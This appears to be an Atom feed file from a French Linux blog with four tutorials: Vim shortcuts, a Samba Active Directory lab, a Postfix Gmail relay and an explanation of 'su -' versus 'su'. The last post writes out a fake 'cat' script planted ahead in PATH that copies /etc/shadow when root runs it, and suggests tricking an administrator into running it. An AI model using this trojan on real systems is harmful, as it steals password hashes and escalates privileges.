@@ -1,0 +1,676 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom"><title>Coubiac - Linux</title><link href="https://Coubiac.github.io/" rel="alternate"></link><link href="https://Coubiac.github.io/feeds/linux.atom.xml" rel="self"></link><id>https://Coubiac.github.io/</id><updated>2022-03-10T19:32:33+01:00</updated><entry><title>"Débuter et survivre dans VIM"</title><link href="https://Coubiac.github.io/debuter-et-survivre-dans-vim.html" rel="alternate"></link><published>2022-03-10T19:32:33+01:00</published><updated>2022-03-10T19:32:33+01:00</updated><author><name>Benoit</name></author><id>tag:coubiac.github.io,2022-03-10:/debuter-et-survivre-dans-vim.html</id><summary type="html">&lt;h1&gt;SORTIR de Vim&lt;/h1&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;:q  : sort
+:q! : force à sortir et abandonner les modifications
+:w  : enregistre
+:wq : enregistre et sort
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h1&gt;Se déplacer&lt;/h1&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;Flèches de direction: se déplacer
+
+h   : déplacer le curseur vers la gauche
+j   : déplacer le curseur vers le bas
+k   : déplacer le curseur vers le haut
+l   : déplacer le …&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</summary><content type="html">&lt;h1&gt;SORTIR de Vim&lt;/h1&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;:q  : sort
+:q! : force à sortir et abandonner les modifications
+:w  : enregistre
+:wq : enregistre et sort
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h1&gt;Se déplacer&lt;/h1&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;Flèches de direction: se déplacer
+
+h   : déplacer le curseur vers la gauche
+j   : déplacer le curseur vers le bas
+k   : déplacer le curseur vers le haut
+l   : déplacer le curseur vers la droite
+
+gg  : aller au début du fichier
+G   : aller à la fin du fichier
+
+w   : aller au début du mot suivant (espace et ponctuation comme séparateur)
+W   : aller au début du mot suivant (espace comme séparateur)
+
+^   : aller au début de la ligne (premier caractère)
+$   : aller à la fin de la ligne
+
+:42 : se déplace à la ligne 42
+42G : se déplace à la ligne 42
+
+/unMot  : se déplace au mot &amp;quot;unMot&amp;quot; vers le bas
+     n  : mot suivant vers le bas
+     N  : mot suivant vers le haut
+?unMot  : se déplace au mot &amp;quot;unMot&amp;quot; vers le haut
+     n  : mot suivant vers le bas
+     N  : mot suivant vers le haut
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h1&gt;Modification&lt;/h1&gt;
+&lt;h2&gt;Modification avec basculement en mode insertion&lt;/h2&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;a   : Insertion après le curseur
+i   : Insertion avant le curseur
+
+A   : Insertion à la fin de la ligne
+I   : Insertion au début de la ligne
+
+o   : Insertion en ajoutant une ligne vers le bas
+O   : Insertion en ajoutant une ligne vers le haut
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h2&gt;Copier - Coller&lt;/h2&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;dd  : Coupe la ligne (peut servir à supprimer la ligne)
+yy  : Copie la ligne
+d   : Coupe le mot
+y   : Copie le mot
+p   : colle
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h2&gt;Rechercher / Remplacer&lt;/h2&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;/unMot  : se déplace au mot &amp;quot;unMot&amp;quot; vers le bas
+     n  : mot suivant vers le bas
+     N  : mot suivant vers le haut
+
+?unMot  : se déplace au mot &amp;quot;unMot&amp;quot; vers le haut
+     n  : mot suivant vers le bas
+     N  : mot suivant vers le haut
+
+:%s/old/new/g   : Recherche le mot &amp;quot;old&amp;quot; et le remplace 
+                  par le mot &amp;quot;new&amp;quot; dans tout le fichier
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h2&gt;Commenter et décommenter un bloc de texte&lt;/h2&gt;
+&lt;p&gt;Commenter un bloc de code&lt;/p&gt;
+&lt;p&gt;&lt;img alt="Commenter un bloc de texte" src="https://i.stack.imgur.com/lu6aU.gif"&gt;&lt;/p&gt;
+&lt;p&gt;Décommenter un bloc de code&lt;/p&gt;
+&lt;p&gt;&lt;img alt="Décommenter un bloc de texte" src="https://i.stack.imgur.com/2Y7eH.gif"&gt;&lt;/p&gt;
+&lt;p&gt;Source: &lt;a href="https://stackoverflow.com/a/1676690"&gt;https://stackoverflow.com/a/1676690&lt;/a&gt;&lt;/p&gt;</content><category term="Linux"></category><category term="[vim]"></category></entry><entry><title>"Créer une infrastructure active directory sous Linux"</title><link href="https://Coubiac.github.io/creer-une-infrastructure-active-directory-sous-linux.html" rel="alternate"></link><published>2021-11-06T15:55:33+01:00</published><updated>2021-11-06T15:55:33+01:00</updated><author><name>Benoit</name></author><id>tag:coubiac.github.io,2021-11-06:/creer-une-infrastructure-active-directory-sous-linux.html</id><summary type="html">&lt;h1&gt;Introduction&lt;/h1&gt;
+&lt;p&gt;Dans ce tutoriel nous allons mettre en place une infrastructure active directory complète sous linux à l'aide de SAMBA.&lt;/p&gt;
+&lt;h1&gt;Qu'est ce que samba ?&lt;/h1&gt;
+&lt;p&gt;Samba est à l'origine une implémentation libre des protocoles SMB/CIFS sous linux. A l'origine, il servaut simplement à partager des fichiers d'un serveur linux à …&lt;/p&gt;</summary><content type="html">&lt;h1&gt;Introduction&lt;/h1&gt;
+&lt;p&gt;Dans ce tutoriel nous allons mettre en place une infrastructure active directory complète sous linux à l'aide de SAMBA.&lt;/p&gt;
+&lt;h1&gt;Qu'est ce que samba ?&lt;/h1&gt;
+&lt;p&gt;Samba est à l'origine une implémentation libre des protocoles SMB/CIFS sous linux. A l'origine, il servaut simplement à partager des fichiers d'un serveur linux à des clients Windows. Depuis la version 4, il permet de créer un controleur de domaine active directory et ainsi fournir les services d'authentification AD mais aussi des stratégies de groupes à des clients Windows. La documentation de &lt;a href="https://wiki.samba.org/index.php/"&gt;Samba&lt;/a&gt; peut être trouvée &lt;a href="https://wiki.samba.org/index.php/"&gt;ici&lt;/a&gt;&lt;/p&gt;
+&lt;h2&gt;Présentation du labo&lt;/h2&gt;
+&lt;p&gt;Pour ce labo je vais utiliser 3 machines virtuelles:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;1 VM Debian 11 nommée "SRV-AD-Linux": IP= 192.168.142.10&lt;/li&gt;
+&lt;li&gt;1 VM d'administration sous Windows 10: PC-ADMIN&lt;/li&gt;
+&lt;li&gt;1 VM Cliente: PC-CLient&lt;/li&gt;
+&lt;li&gt;1 routeur pour l'accès internet: IP= 192.168.142.250&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2&gt;Installation du serveur AD&lt;/h2&gt;
+&lt;h2&gt;Installation de la VM Linux&lt;/h2&gt;
+&lt;p&gt;Pour cette VM, je vais utiliser Debian 11. Je vais commencer par l'installer de manière standard avec juste le minimum syndical. Je ne vais pas décrire l'installation d'une VM Debian basique car ce n'est pas l'objet du tuto mais voici les paquets choisis:&lt;/p&gt;
+&lt;p&gt;&lt;img alt="Installation de debian" src="/images/samba/packets-debian.png"&gt;&lt;/p&gt;
+&lt;p&gt;C'est parti...&lt;/p&gt;
+&lt;p&gt;&lt;img alt="Installation de debian" src="/images/samba/install-in-progress.png"&gt;&lt;/p&gt;
+&lt;p&gt;Et voila !&lt;/p&gt;
+&lt;p&gt;&lt;img alt="Installation de debian" src="/images/samba/install-terminée.png"&gt;&lt;/p&gt;
+&lt;h2&gt;Configuration Pré-installation&lt;/h2&gt;
+&lt;h3&gt;Désactivation d'IPV6.&lt;/h3&gt;
+&lt;p&gt;N'ayant pas besoin d'IPV6 dans ce tuto, je vais le désactiver complètement en ajoutant ces lignes à la fin du fichier /etc/sysctl.conf&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;net.ipv6.conf.all.disable_ipv6 &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="m"&gt;1&lt;/span&gt;
+net.ipv6.conf.default.disable_ipv6 &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="m"&gt;1&lt;/span&gt;
+net.ipv6.conf.lo.disable_ipv6 &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="m"&gt;1&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;On applique les changements à l'aide de la commande "sysctl -p"&lt;/p&gt;
+&lt;h3&gt;Vérification du fichier /etc/hosts:&lt;/h3&gt;
+&lt;p&gt;Il faut que le fichier /etc/hosts soit correctement configuré pour résoudre le nom de domaine enièrement qualifié (FQDN) et le nom d'hôte court vers l'adresse IP du controlleur de domaine.&lt;/p&gt;
+&lt;p&gt;&lt;img alt="fichier /etc/hosts" src="/images/samba/etc-hosts.png"&gt;&lt;/p&gt;
+&lt;h3&gt;installation d'un serveur de temps (ntp):&lt;/h3&gt;
+&lt;p&gt;Je ne vais pas m'attarder sur l'installation et la configuration d'un serveur de temps sous linux mais je vous met sur la piste:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;apt update
+apt install ntp
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h3&gt;installation de Samba:&lt;/h3&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;apt-get install acl attr samba samba-dsdb-modules samba-vfs-modules winbind libpam-winbind libnss-winbind libpam-krb5 krb5-config krb5-user
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;L'installation commence:&lt;/p&gt;
+&lt;p&gt;&lt;img alt="installation de samba" src="/images/samba/install-samba.png"&gt;&lt;/p&gt;
+&lt;p&gt;Le programme d'installation nous demande le nom du domaine par défault. Il s'agit du domaine AD. Pour moi, j'ai choisit coubiac.local&lt;/p&gt;
+&lt;p&gt;&lt;img alt="domaine-kerberos" src="/images/samba/domaine-kerberos.png"&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img alt="serveur administratif kerberos" src="/images/samba/server-administratif-kerberos.png"&gt;&lt;/p&gt;
+&lt;p&gt;Voila, l'installation est terminée !&lt;/p&gt;
+&lt;p&gt;&lt;img alt="installation de samba terminée" src="/images/samba/install-samba-terminee.png"&gt;&lt;/p&gt;
+&lt;h3&gt;Configuration de samba&lt;/h3&gt;
+&lt;p&gt;Il faut commencer par arreter tous les process samba|smbd|nmbd|winbindd:&lt;/p&gt;
+&lt;p&gt;&lt;img alt="installation de samba terminée" src="/images/samba/process1.png"&gt;&lt;/p&gt;
+&lt;p&gt;Ensuite il faut supprimer le fichier smb.conf créé par défault. Vous pouvez le trouver à l'aide cette commande:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;smbd -b &lt;span class="p"&gt;|&lt;/span&gt; grep &lt;span class="s2"&gt;&amp;quot;CONFIGFILE&amp;quot;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img alt="fichier de conf samba" src="/images/samba/find-smbd.png"&gt;&lt;/p&gt;
+&lt;p&gt;On peut donc le renomer en smb.conf.old&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;mv /etc/samba/smb.conf /etc/samba/smb.conf.old
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;Il faut ensuite supprimer tous les fichiers de base de donnée &lt;em&gt;.tdb et &lt;/em&gt;.ldb. 
+Pour lister les dossiers qui contiennent ces bases de données:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;smbd -b &lt;span class="p"&gt;|&lt;/span&gt; egrep &lt;span class="s2"&gt;&amp;quot;LOCKDIR|STATEDIR|CACHEDIR|PRIVATE_DIR&amp;quot;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img alt="fichier de conf samba" src="/images/samba/sambatld.png"&gt;&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;rm /run/samba/&lt;span class="o"&gt;{&lt;/span&gt;*.tdb,*.ldb&lt;span class="o"&gt;}&lt;/span&gt;
+rm /var/lib/samba/&lt;span class="o"&gt;{&lt;/span&gt;*.tdb,*.ldb&lt;span class="o"&gt;}&lt;/span&gt;
+rm /var/cache/samba/&lt;span class="o"&gt;{&lt;/span&gt;*.tdb,*.ldb&lt;span class="o"&gt;}&lt;/span&gt;
+rm /var/lib/samba/private/&lt;span class="o"&gt;{&lt;/span&gt;*.tdb,*.ldb&lt;span class="o"&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;Ensuite édite le fichier /etc/krb5.conf de cette manière:&lt;/p&gt;
+&lt;p&gt;&lt;img alt="fichier de conf krb5" src="/images/samba/krb5conf.png"&gt;&lt;/p&gt;
+&lt;p&gt;Pour provisionner notre domaine, nous allons utiliser l'outil "samba-tool"&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;samba-tool domain provision --use-rfc2307 --interactive
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img alt="provisionning" src="/images/samba/provisionning.png"&gt;&lt;/p&gt;
+&lt;p&gt;On peut maintenant vérifier notre fichier /etc/samba/smb.conf&lt;/p&gt;
+&lt;p&gt;&lt;img alt="smb.conf" src="/images/samba/smbconf.png"&gt;&lt;/p&gt;
+&lt;p&gt;Le script de config crée un fichier krb5.conf dans le dossier /var/lib/samba/private/krb5.conf.
+Il faut supprimer ce fichier et le remplacer par celui se trouvant dans /etc/krb5.conf&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;rm -f /var/lib/samba/private/krb5.conf
+ln -s /etc/krb5.conf /var/lib/samba/private/krb5.conf
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;Ensuite on peut configurer le démarrage des services:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;systemctl unmask samba-ad-dc
+systemctl &lt;span class="nb"&gt;enable&lt;/span&gt; samba-ad-dc
+systemctl disable samba winbind nmbd smbd
+systemctl mask samba winbind nmbd smbd
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;On vérifie:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;systemctl list-unit-files &lt;span class="p"&gt;|&lt;/span&gt;egrep &lt;span class="s1"&gt;&amp;#39;samba|winbind|nmbd|smbd&amp;#39;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;Il faut ensuite activer les ACL et attributs étendus sur la partition ou est installée SAMBA. On modifie donc notre fichier fstab:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;vi /etc/fstab
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;et on ajoute les options 'acl' et 'user_xattr'&lt;/p&gt;
+&lt;p&gt;&lt;img alt="smb.conf" src="/images/samba/fstab.png"&gt;&lt;/p&gt;
+&lt;p&gt;Ensuite on remonte la partition (ou on reboot):&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;mount -o remount /
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;Il faut maintenant corriger les permissions sur les partages sysvol et netlogon&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;samba-tool ntacl sysvolreset
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;Et voilà ! votre DC devrait être fonctionnel ! il ne reste plus qu'à le tester avec un windows 10.&lt;/p&gt;
+&lt;h2&gt;Ajout d'une machine au domaine&lt;/h2&gt;
+&lt;p&gt;Si tout s'est bien passé, vous ne devriez pas avoir de soucis pour joindre le domaine:&lt;/p&gt;
+&lt;p&gt;&lt;img alt="joindredomaine" src="/images/samba/joindredomaine.png"&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img alt="joindredomaine" src="/images/samba/joindredomaine2.png"&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img alt="joindredomaine" src="/images/samba/joindredomaine3.png"&gt;&lt;/p&gt;
+&lt;p&gt;Il faut ensuite installer les outils RSAT pour administrer l'active directory:&lt;/p&gt;
+&lt;p&gt;&lt;img alt="rsat" src="/images/samba/rsat0.png"&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img alt="rsat" src="/images/samba/rsat1.png"&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img alt="rsat" src="/images/samba/rsat2.png"&gt;&lt;/p&gt;
+&lt;p&gt;J'ai ensuite, à l'aide des outils RSAT mis en place une GPO pour forcer le fond d'écran et un GPO pour mettre en place des administrateurs locaux et tout fonctionne !&lt;/p&gt;
+&lt;p&gt;&lt;img alt="GPO" src="/images/samba/GPO_ADMIN_LOCAUX.png"&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img alt="GPO" src="/images/samba/GPO_FOND_ECRAN.png"&gt;&lt;/p&gt;</content><category term="Linux"></category><category term="[active directory"></category><category term="linux"></category><category term="samba]"></category></entry><entry><title>"Envoyer des mails de notification depuis un serveur Debian"</title><link href="https://Coubiac.github.io/envoyer-des-mails-de-notification-depuis-un-serveur-debian.html" rel="alternate"></link><published>2020-11-02T20:30:30+01:00</published><updated>2020-11-02T20:30:30+01:00</updated><author><name>Benoit</name></author><id>tag:coubiac.github.io,2020-11-02:/envoyer-des-mails-de-notification-depuis-un-serveur-debian.html</id><summary type="html">&lt;p&gt;Dans ce tuto nous allons installer postfix afin d'envoyer des mails depuis notre serveur DEBIAN 10.&lt;/p&gt;
+&lt;h1&gt;Installation de Postfix&lt;/h1&gt;
+&lt;p _="%" endhighlight&gt;On commence par mettre à jour le système et installer Postfix
+{% highlight bash %}
+~# apt-get update &amp;amp;&amp;amp; apt-get upgrade
+~# apt-get install libsasl2-modules postfix&lt;/p&gt;
+&lt;p&gt;Postfix va lancer l'assistant d'installation:&lt;/p&gt;
+&lt;p&gt;&lt;img alt="assistant1" src="/images/postfix/screen1.png"&gt;&lt;/p&gt;
+&lt;p&gt;Ensuite postfix va vous demander …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Dans ce tuto nous allons installer postfix afin d'envoyer des mails depuis notre serveur DEBIAN 10.&lt;/p&gt;
+&lt;h1&gt;Installation de Postfix&lt;/h1&gt;
+&lt;p _="%" endhighlight&gt;On commence par mettre à jour le système et installer Postfix
+{% highlight bash %}
+~# apt-get update &amp;amp;&amp;amp; apt-get upgrade
+~# apt-get install libsasl2-modules postfix&lt;/p&gt;
+&lt;p&gt;Postfix va lancer l'assistant d'installation:&lt;/p&gt;
+&lt;p&gt;&lt;img alt="assistant1" src="/images/postfix/screen1.png"&gt;&lt;/p&gt;
+&lt;p&gt;Ensuite postfix va vous demander de choisir un type d'installation. Vous allez choisir &lt;code&gt;site internet&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img alt="assistant2" src="/images/postfix/screen2.png"&gt;&lt;/p&gt;
+&lt;p&gt;Entrez ensuite votre nom de domaine:&lt;/p&gt;
+&lt;p&gt;&lt;img alt="assistant3" src="/images/postfix/screen3.png"&gt;&lt;/p&gt;
+&lt;h2&gt;Création d'un mot de passe application pour GMAIL&lt;/h2&gt;
+&lt;p&gt;Si vous avez activé l'authentification à deux facteurs (2FA), vous devez créer un mot de passe Application.
+Vous pouvez consulter la documentation google à &lt;a href="https://support.google.com/mail/answer/185833?hl=fr"&gt;cette adresse&lt;/a&gt;&lt;/p&gt;
+&lt;h2&gt;Paramétrage de postfix&lt;/h2&gt;
+&lt;p&gt;il faut ensuite modifier le fichier &lt;code&gt;/etc/postfix/main.cf&lt;/code&gt; afin de modifier la valeur &lt;code&gt;myhostname&lt;/code&gt; avec notre nom d'hôte pleinement qualifié (fqdn)&lt;/p&gt;
+&lt;p _="%" endhighlight&gt;{% highlight bash %}
+myhostname = mail.exemple.fr&lt;/p&gt;
+&lt;p&gt;Nous allons maintenant ajouter le mot de passe du compte gmail (Attention, si vous avez activé l'authentification à deux facteurs de bien utilisé le mot de passe généré plus haut...). Nous allons pour cela modifier le fichier &lt;code&gt;/etc/postfix/sasl/sasl_passwd&lt;/code&gt;&lt;/p&gt;
+&lt;p _="%" endhighlight&gt;{% highlight bash %}
+~# vi /etc/postfix/sasl/sasl_passwd&lt;/p&gt;
+&lt;p _="%" endhighlight&gt;insérez ici l'authentification de cette manière (vous pouvez faire un copier-coller et remplacer le login/mdp avec les bonnes valeurs):
+{% highlight bash %}
+[smtp.gmail.com]:587 username@gmail.com:password&lt;/p&gt;
+&lt;p&gt;On peut maintenant utiliser la commande &lt;code&gt;postmap&lt;/code&gt;pour générer un fichier de bdd de hash:&lt;/p&gt;
+&lt;p _="%" endhighlight&gt;{% highlight bash %}
+~# postmap /etc/postfix/sasl/sasl_passwd&lt;/p&gt;
+&lt;p _="%" endhighlight&gt;Nous allons sécuriser un peu l'accès aux fichiers:
+{% highlight bash %}
+~# chown root:root /etc/postfix/sasl/sasl_passwd /etc/postfix/sasl/sasl_passwd.db 
+~# chmod 0600 /etc/postfix/sasl/sasl_passwd /etc/postfix/sasl/sasl_passwd.db&lt;/p&gt;
+&lt;h2&gt;Configurer le relay postfix&lt;/h2&gt;
+&lt;p&gt;Nous allons modifier le fichier &lt;code&gt;main.cf&lt;/code&gt; afin de relayer le courrier vers le smtp de gmail:&lt;/p&gt;
+&lt;p _="%" endhighlight&gt;{% highlight bash %}
+~# vi /etc/postfix/main.cf&lt;/p&gt;
+&lt;p&gt;On modifie la valeur &lt;code&gt;relayhost&lt;/code&gt;:&lt;/p&gt;
+&lt;p _="%" endhighlight&gt;{% highlight bash %}
+relayhost = [smtp.gmail.com]:587&lt;/p&gt;
+&lt;p&gt;Ensuite on ajoute ces lignes pour activer l'authentification:&lt;/p&gt;
+&lt;p _="%" endhighlight&gt;{% highlight bash %}
+smtp_sasl_auth_enable = yes
+smtp_sasl_security_options = noanonymous
+smtp_sasl_password_maps = hash:/etc/postfix/sasl/sasl_passwd
+smtp_tls_security_level = encrypt
+smtp_tls_CAfile = /etc/ssl/certs/ca-certificates.crt&lt;/p&gt;
+&lt;h2&gt;Configurer l'adresse mail de root&lt;/h2&gt;
+&lt;p _="%" endhighlight&gt;on edite le fichier &lt;code&gt;/etc/aliases&lt;/code&gt;
+{% highlight bash %}
+vi /etc/aliases&lt;/p&gt;
+&lt;p _="%" bash highlight&gt;le fichier doit ressembler à&lt;/p&gt;
+&lt;h1&gt;See man 5 aliases for format&lt;/h1&gt;
+&lt;p _="%" endhighlight&gt;postmaster: root
+root: username@domaine.com # On ajoute cette ligne avec l'adresse mail de l'admin du serveur&lt;/p&gt;
+&lt;p _="%" endhighlight&gt;On compile les alias:
+{% highlight bash %}
+newaliases&lt;/p&gt;
+&lt;p _="%" endhighlight&gt;on redémarre ensuite postfix
+{% highlight bash %}
+service postfix restart&lt;/p&gt;
+&lt;h2&gt;Test d'envoi de mail&lt;/h2&gt;
+&lt;p&gt;On peut utiliser sendmail pour tester l'envoi d'un mail (attention le point . à la fin est important):&lt;/p&gt;
+&lt;p&gt;{% highlight bash %}&lt;/p&gt;
+&lt;h1&gt;sendmail root&lt;/h1&gt;
+&lt;p _="%" endhighlight&gt;From: monserveur
+Subject: Mail test
+Ceci est un test
+.&lt;/p&gt;
+&lt;p&gt;Vous pouvez vérifier que tout s'est bien passé en consultant les logs:&lt;/p&gt;
+&lt;p _="%" endhighlight&gt;{% highlight bash %}
+tail -f /var/log/mail.log&lt;/p&gt;</content><category term="Linux"></category><category term="[linux"></category><category term="postfix"></category><category term="gmail]"></category></entry><entry><title>"Pourquoi utiliser 'su -' plutôt que 'su'"</title><link href="https://Coubiac.github.io/pourquoi-utiliser-su-plutot-que-su.html" rel="alternate"></link><published>2020-10-30T19:32:33+01:00</published><updated>2020-10-30T19:32:33+01:00</updated><author><name>Benoit</name></author><id>tag:coubiac.github.io,2020-10-30:/pourquoi-utiliser-su-plutot-que-su.html</id><summary type="html">&lt;p&gt;&lt;code&gt;su -&lt;/code&gt; invoque un shell de connexion après avoir changé d'utilisateur. Un shell de connexion réinitialise la plupart des variables d'environnement, fournissant une base propre.&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;su&lt;/code&gt; ne fait que changer d'utilisateur, fournissant un shell normal avec un environnement presque identique à celui de l'ancien utilisateur.&lt;/p&gt;
+&lt;p&gt;Imaginez que vous êtes un développeur …&lt;/p&gt;</summary><content type="html">&lt;p&gt;&lt;code&gt;su -&lt;/code&gt; invoque un shell de connexion après avoir changé d'utilisateur. Un shell de connexion réinitialise la plupart des variables d'environnement, fournissant une base propre.&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;su&lt;/code&gt; ne fait que changer d'utilisateur, fournissant un shell normal avec un environnement presque identique à celui de l'ancien utilisateur.&lt;/p&gt;
+&lt;p&gt;Imaginez que vous êtes un développeur de logiciels avec un accès normal à une machine et que votre administrateur ignorant ne vous donne pas l'accès au compte root. Essayons (avec un peu de chance) de le piéger:&lt;/p&gt;
+&lt;p&gt;Vous connnaisser évidement la commande &lt;code&gt;cat&lt;/code&gt;qui permet d'afficher le contenu d'un fichier ? Nous allons la piéger en en créant une fausse:&lt;/p&gt;
+&lt;p&gt;Nous allons la stocker dans le dossier &lt;code&gt;tmp&lt;/code&gt;&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;$ mkdir /tmp/evil_bin
+$ vi /tmp/evil_bin/cat
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;Nous créons donc un script que nous allons évidement appeler &lt;code&gt;cat&lt;/code&gt;
+Dans ce script, si l'utilisateur n'est pas root, le script simulera un message de permission refusée.
+Si l'utilisateur est root, le script va copier le contenu du fichier &lt;code&gt;/etc/shadow&lt;/code&gt; dans le dossier &lt;code&gt;tmp&lt;/code&gt; 
+Il va ensuite executer la commande &lt;code&gt;cat&lt;/code&gt; normalement.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="ch"&gt;#!/bin/bash&lt;/span&gt;
+&lt;span class="nb"&gt;test&lt;/span&gt; &lt;span class="nv"&gt;$UID&lt;/span&gt; !&lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="m"&gt;0&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt; &lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;/bin/cat: Permission denied!&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="nb"&gt;exit&lt;/span&gt; &lt;span class="m"&gt;1&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="o"&gt;}&lt;/span&gt; 
+/bin/cat /etc/shadow &lt;span class="p"&gt;&amp;amp;&lt;/span&gt;&amp;gt;/tmp/shadow_copy
+/bin/cat &lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="nv"&gt;$@&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;
+&lt;span class="nb"&gt;exit&lt;/span&gt; &lt;span class="m"&gt;0&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;Nous allons maintenent rendre le script executable et l'ajouter dans notre &lt;code&gt;PATH&lt;/code&gt; afin de pouvoir l'executer depuis n'importe quel dossier:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;chmod +x /tmp/evil_bin/cat&lt;span class="sb"&gt;`&lt;/span&gt;
+&lt;span class="nv"&gt;PATH&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;/tmp/evil_bin:&lt;/span&gt;&lt;span class="nv"&gt;$PATH&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;Maintenant, allez voir votre administrateur pour lui demander pourquoi vous n'arrivez pas à afficher un fichier avec la commande &lt;code&gt;cat&lt;/code&gt;.&lt;/p&gt;
